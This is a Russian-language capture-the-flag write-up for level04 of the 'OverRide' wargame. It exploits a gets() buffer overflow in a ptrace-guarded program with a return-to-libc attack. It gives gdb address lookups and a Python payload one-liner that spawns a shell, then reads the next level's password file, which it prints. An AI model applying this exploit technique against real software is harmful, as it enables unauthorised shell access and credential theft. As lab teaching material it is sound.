Эта программа создает дочерний процесс с помощью fork и отслеживает его с помощью ptrace.
Родительский процесс ожидает завершения дочернего процесса и не позволяет дочернему процессу выполнить системный вызов exec, немедленно его завершая.
Дочерний процесс запрашивает у пользователя «некоторый шелл-код», а затем возвращается. Мы можем видеть в коде вызов get, который может легко привести к переполнению буфера.

Поскольку мы не можем сделать системный вызов exec, вместо этого мы вызовем "системную" функцию C с атакой return2libc.
Быстрый тест показывает нам, что смещение от буфера к сохраненному eip от main составляет 156 байт.
нам нужно всего 3 адреса:
- адрес функции libc system ().
- (может быть любым) адрес инструкции для выполнения после вызова system (), мы будем использовать адрес libc exit ().
- адрес строки '/ bin / sh'.

Всю эту информацию можно получить с помощью gdb:

------------------------------------------------------------------------------------------

(gdb) p system
$4 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$5 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.

Собрав всю эту информацию, вот результат:

------------------------------------------------------------------------------------------

level04@OverRide:~$ (python -c "print 156 * 'A' + '\xf7\xe6\xae\xd0'[::-1] + '\xf7\xe5\xeb\x70'[::-1] + '\xf7\xf8\x97\xec'[::-1]" ; cat) |./level04
Give me some shellcode, k
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN

